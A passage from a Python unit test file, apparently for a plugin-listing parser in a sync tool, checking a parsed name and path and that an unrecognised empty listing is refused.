        self.assertEqual(self.parse(text), [{'name': 'ce', 'path': '/p/v1'}])

    def test_unrecognised_listing_is_refused(self):
        with self.assertRaises(sync.Failure):
            self.parse('[]')


# The manifest check against the pinned tree itself runs in the agent-plugins
# check, which can see the flake input; this check's sandbox cannot.


if __name__ == '__main__':
    unittest.main()
